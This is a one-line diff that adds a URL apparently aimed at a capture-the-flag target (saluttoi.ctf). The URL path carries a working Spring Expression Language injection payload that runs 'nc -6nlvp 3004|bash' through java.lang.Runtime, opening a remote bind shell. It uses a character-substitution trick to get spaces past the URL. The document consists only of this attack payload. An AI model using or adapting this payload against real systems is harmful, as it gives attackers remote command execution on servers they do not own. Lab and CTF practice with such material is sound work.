@@ -1,0 +1,1 @@
+http://saluttoi.ctf/product/$%7BT(java.lang.Runtime).getRuntime().exec(%22sh:-c:nc_-6nlvp_3004%7Cbash%22.replace('_',T(java.lang.Character).toString(32)).split(%22:%22)).waitFor()%7D
